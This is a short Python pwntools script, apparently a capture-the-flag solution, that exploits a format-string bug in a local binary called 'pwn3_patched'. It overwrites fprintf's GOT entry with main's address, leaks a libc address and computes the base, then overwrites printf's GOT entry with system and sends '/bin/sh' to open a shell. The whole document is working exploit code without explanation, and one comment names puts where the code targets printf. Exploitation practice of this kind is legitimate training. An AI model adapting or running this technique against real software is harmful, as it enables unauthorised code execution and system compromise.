from pwn import *

context.binary = exe = ELF('./pwn3_patched', checksec = False)
libc = ELF('./libc-2.31.so', checksec = False)

p = process(exe.path)

input()
main_addr = exe.sym['main']

#got overwrite fprintf
payload = f'%{main_addr & 0xffff}c%18$hn'.encode()
payload = payload.ljust(0x20, b'P')
payload += p64(exe.got['fprintf'])
p.sendlineafter(b"What's your name? ", payload)

#leak libc addr
payload = b'%45$p'
p.sendlineafter(b"What's your name? ", payload)
p.recvuntil(b'Hello ')
libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - 0x24083
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

#got overwrite puts
system_addr = libc.sym['system']
part1 = system_addr & 0xff
part2 = system_addr >> 8 & 0xffff

payload = f'%{part1}c%18$hhn'.encode()
payload += f'%{part2 - part1}c%19$hn'.encode()
payload = payload.ljust(0x20, b'P')
payload += p64(exe.got['printf'])
payload += p64(exe.got['printf'] + 1)
p.sendlineafter(b"What's your name? ", payload)
p.sendline(b'/bin/sh')

p.interactive()